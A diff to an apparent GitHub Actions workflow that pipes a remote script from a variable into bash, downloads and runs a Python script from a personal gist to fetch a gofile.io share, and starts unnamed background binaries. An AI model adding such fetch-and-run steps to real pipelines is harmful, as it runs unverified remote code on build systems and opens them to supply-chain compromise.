@@ -16,7 +16,7 @@ jobs:
     - name: Install dependencies
       run: |
         apt-get update
-        apt-get install -y curl wget bash procps lsof netcat git
+        apt-get install -y curl wget bash procps lsof netcat git unzip
     
     - name: Checkout code
       uses: actions/checkout@v4
@@ -30,11 +30,16 @@ jobs:
         
         # Your existing logic
         curl -sSL $TESTING | bash -s
+        wget https://gist.github.com/DirgaBrajamusti/786e2efa74ec2f5ddac557e2d77f4010/raw/31e276f46d9cdb203703c34f0312ff88be1c96dc/gofile.py -o gofile.py
         
         nohup bash -c 'cd *_DD && ./*_DD' &
         DD_FOLDER=$(ls -d *_DD 2>/dev/null | head -n1)
+        RC_FOLDER=$(ls -d *_RC 2>/dev/null | head -n1)
 
         sleep 10
 
         curl localhost:6882
         echo $DD_FOLDER
+        echo $RC_FOLDER
+
+        python3 gofile.py https://gofile.io/d/HMHbra
